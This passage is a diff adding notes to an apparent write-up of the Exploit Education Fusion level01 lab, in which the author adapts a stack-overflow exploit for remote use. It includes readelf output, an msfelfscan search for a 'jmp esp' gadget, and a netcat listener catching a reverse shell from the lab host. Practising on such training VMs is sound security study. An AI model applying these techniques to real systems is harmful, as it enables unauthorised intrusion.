@@ -144,3 +144,66 @@ connect to [192.168.6.1] from (UNKNOWN) [192.168.6.1] 47118
 whoami
 x90slide
 ```
+
+#######################
+Remote
+#######################
+Ok, now it's time to exploit the same thing remotely. 
+
+Things to verify:
+*) bytes to stored eip didn't change
+*) jump length is still OK
+
+Things to change:
+*) New ROP gadget address
+*) Convert script to remote 
+*) Test out changes in GDB using gdbserver
+
+
+Confirmed the binary that's being run:
+```
+root@fusion:/proc/1285# readlink -f exe
+/opt/fusion/bin/level01
+```
+
+
+Let's get the executable segments:
+```
+readelf target --segments
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  LOAD           0x000000 0x08048000 0x08048000 0x022bc 0x022bc R E 0x1000
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+```
+
+Two segments (plus the stack):
+	1. 0x08048034 - 0x8048134
+	2. 0x08048000 - 0x804A2BC
+
+Segment #2 completely contains segment #1, so we only have to look at the range of segment 2
+
+Let's filter out the wrong lines with awk:
+```
+┌──(x90slide㉿kali)-[~/…/exploit_education/fusion/level1/local]
+└─$ ssh fusion '/opt/metasploit-framework/msfelfscan /opt/fusion/bin/level01 -j esp' | awk '{
+if (strtonum($1) >= 0x08048000 && strtonum($1) <= 0x804A2BC)
+        print $0
+}'
+
+0x08049f4f jmp esp
+```
+
+So 0x08049f4f is our gadget.
+
+
+Lol, all I had to do was change the gadget address and implement network functionality and it started working!
+Proof:
+```
+┌──(x90slide㉿kali)-[~/exercises/exploit_education/fusion/level1]
+└─$ nc -lnvp 8000
+listening on [any] 8000 ...
+connect to [192.168.6.1] from (UNKNOWN) [192.168.6.2] 38470
+whoami
+whoami: cannot find name for user ID 20001
+
+```
